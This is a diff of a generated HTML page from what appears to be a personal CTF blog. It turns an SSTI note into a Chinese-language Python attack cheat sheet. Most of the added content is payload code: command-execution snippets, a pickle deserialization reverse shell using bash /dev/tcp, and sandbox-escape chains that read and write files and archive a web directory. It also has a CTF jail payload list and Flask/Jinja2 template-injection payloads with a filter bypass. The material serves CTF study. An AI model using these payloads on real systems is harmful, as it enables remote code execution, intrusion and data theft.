@@ -13,7 +13,7 @@
         <meta name="description" content="Windforce17's blog">
       
       
-        <link rel="canonical" href="https://windforce17.github.io/blog/ctf/web/ssti/">
+        <link rel="canonical" href="https://windforce17.github.io/blog/ctf/web/python/">
       
       
         <meta name="author" content="Windforce17">
@@ -42,7 +42,7 @@
     
     
       
-        <title>Ssti - windforce17's blog</title>
+        <title>Python - windforce17's blog</title>
       
     
     
@@ -110,7 +110,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#flask-ssti" tabindex="1" class="md-skip">
+      <a href="#_1" tabindex="1" class="md-skip">
         跳转至
       </a>
     
@@ -135,7 +135,7 @@
               windforce17's blog
             </span>
             <span class="md-header-nav__topic">
-              Ssti
+              Python
             </span>
           
         </div>
@@ -2050,11 +2050,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        Ssti
+        Python
       </label>
     
-    <a href="./" title="Ssti" class="md-nav__link md-nav__link--active">
-      Ssti
+    <a href="./" title="Python" class="md-nav__link md-nav__link--active">
+      Python
     </a>
     
       
@@ -2066,16 +2066,51 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#flask-ssti" title="flask ssti" class="md-nav__link">
-    flask ssti
+  <a href="#_1" title="命令执行" class="md-nav__link">
+    命令执行
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" title="反弹shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="沙盒绕过" class="md-nav__link">
+    沙盒绕过
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="格式化字符串漏洞" class="md-nav__link">
+    格式化字符串漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flaskjinja2-ssti" title="flask/Jinja2 ssti" class="md-nav__link">
+    flask/Jinja2 ssti
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="读配置" class="md-nav__link">
+  <a href="#_4" title="读配置" class="md-nav__link">
     读配置
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="命令执行" class="md-nav__link">
+    命令执行
   </a>
   
 </li>
@@ -2371,16 +2406,51 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#flask-ssti" title="flask ssti" class="md-nav__link">
-    flask ssti
+  <a href="#_1" title="命令执行" class="md-nav__link">
+    命令执行
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" title="反弹shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="沙盒绕过" class="md-nav__link">
+    沙盒绕过
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="格式化字符串漏洞" class="md-nav__link">
+    格式化字符串漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flaskjinja2-ssti" title="flask/Jinja2 ssti" class="md-nav__link">
+    flask/Jinja2 ssti
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="读配置" class="md-nav__link">
+  <a href="#_4" title="读配置" class="md-nav__link">
     读配置
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="命令执行" class="md-nav__link">
+    命令执行
   </a>
   
 </li>
@@ -2412,29 +2482,134 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/web/ssti.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/web/python.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                  <h1>Ssti</h1>
+                  <h1>Python</h1>
                 
-                <h2 id="flask-ssti">flask ssti<a class="headerlink" href="#flask-ssti" title="Permanent link">&para;</a></h2>
-<h3 id="_1">读配置<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>{{url_for.__globals__[&#39;current_app&#39;].config}}
+                <h2 id="_1">命令执行<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">platform</span>
+<span class="n">platform</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ipconfig&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="s1">&#39;ipconfig&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</pre></div>
+
+<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># encoding: utf-8</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="k">class</span> <span class="nc">test</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">code</span><span class="o">=</span><span class="s1">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="n">code</span><span class="p">,))</span>
+<span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="p">()</span>
+<span class="n">c</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">c</span>
+<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</pre></div>
+
+<h2 id="_2">沙盒绕过<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><div class="codehilite"><pre><span></span><span class="c1"># read 函数，读文件</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;abc.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="c1"># write 函数，写文件</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/var/www/html/input&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">)</span>
+<span class="c1"># 执行任意命令</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">13</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#39;</span> <span class="p">)</span>
+<span class="c1"># 通过 system 执行任意命令</span>
+<span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+<span class="c1"># 通过 popen 执行任意命令</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;func_globals&#39;</span><span class="p">)[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="c1"># 打包文件</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;func_globals&#39;</span><span class="p">)[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;tar -czvf /tmp/www.tar.gz /home/ctf/www&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="c1"># base64 编码读取文件</span>
+<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;func_globals&#39;</span><span class="p">)[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;base64 /tmp/www.tar.gz&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+题目:
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python2.7 -u</span>
+
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span>
+<span class="n">modules</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="k">del</span> <span class="n">modules</span>
+
+<span class="n">_raw_input</span> <span class="o">=</span> <span class="nb">raw_input</span>
+<span class="n">_BaseException</span> <span class="o">=</span> <span class="ne">BaseException</span>
+<span class="n">_EOFError</span> <span class="o">=</span> <span class="ne">EOFError</span>
+
+<span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="n">__builtins__</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">print</span> <span class="s1">&#39;Get a shell, if you can...&#39;</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="bp">None</span><span class="p">}</span>
+        <span class="k">exec</span> <span class="s1">&#39;x=&#39;</span><span class="o">+</span><span class="n">_raw_input</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span> <span class="ow">in</span> <span class="n">d</span>
+        <span class="k">print</span> <span class="s1">&#39;Return Value:&#39;</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]</span>
+    <span class="k">except</span> <span class="n">_EOFError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">e</span>
+    <span class="k">except</span> <span class="n">_BaseException</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s1">&#39;Exception:&#39;</span><span class="p">,</span> <span class="n">e</span>
+</pre></div>
+payloads:
+<div class="codehilite"><pre><span></span><span class="n">data</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="sd">&quot;&quot;&quot;1;__builtins__[&#39;a&#39;]=[].__class__.__base__&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="sd">&quot;&quot;&quot;1;__builtins__[&#39;b&#39;]=a.__subclasses__()[59]&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="sd">&quot;&quot;&quot;1;__builtins__[&#39;c&#39;]=b.__init__.__globals__&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="sd">&quot;&quot;&quot;1;__builtins__[&#39;d&#39;]=c[&#39;linecache&#39;].__dict__&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="sd">&quot;&quot;&quot;1;__builtins__[&#39;e&#39;]=d[&#39;os&#39;].system&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="sd">&quot;&quot;&quot;1;x=e(&#39;ls&#39;)&quot;&quot;&quot;</span><span class="p">,</span>
+<span class="p">]</span>
+</pre></div></p>
+<h2 id="_3">格式化字符串漏洞<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+
+<span class="c1"># a == joe</span>
+<span class="n">input_t</span> <span class="o">=</span> <span class="s1">&#39;{0.name}&#39;</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">input_t</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">User</span><span class="p">(</span><span class="s1">&#39;joe&#39;</span><span class="p">))</span>
+
+<span class="c1"># a == joe</span>
+<span class="n">input_t</span> <span class="o">=</span> <span class="s1">&#39;{user.name}&#39;</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">input_t</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">User</span><span class="p">(</span><span class="s1">&#39;joe&#39;</span><span class="p">))</span>
+</pre></div>
+
+<h2 id="flaskjinja2-ssti">flask/Jinja2 ssti<a class="headerlink" href="#flaskjinja2-ssti" title="Permanent link">&para;</a></h2>
+<h3 id="_4">读配置<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span>#配置
+{{config}}
+# 对象字典
+{{request.environ}}
+{{url_for.__globals__[&#39;current_app&#39;].config}}
 {{get_flashed_messages.__globals__[&#39;current_app&#39;].config}}
 </pre></div>
 
 <div class="codehilite"><pre><span></span>{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls -r /*/*&quot;).read()&#39;)}}
 </pre></div>
 
-<p><code>{% for c in [].__class__.__base__.__subclasses__() %}
- {% if c.__name__ == 'catch_warnings' %}
+<h3 id="_5">命令执行<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span>{% for c in [].__class__.__base__.__subclasses__() %}
+ {% if c.__name__ == &#39;catch_warnings&#39; %}
   {% for b in c.__init__.func_globals.values() %} 
-  {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("ls").read()') }} 
+  {% if b.__class__ == {}.__class__ %} {% if &#39;eval&#39; in b.keys() %} {{ b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) }} 
   {% endif %}
    {% endif %} 
    {% endfor %} 
    {% endif %} 
-   {% endfor %}</code></p>
+   {% endfor %} 
+  ```
+
+### 绕过过滤
+```py
+{(&#39;&#39;|attr(&#39;__class__&#39;)}}，{(&#39;&#39;[&#39;__class__&#39;])}}
+# 等价于
+{{&#39;&#39;.__class__}}
+</pre></div>
                 
                   
                 
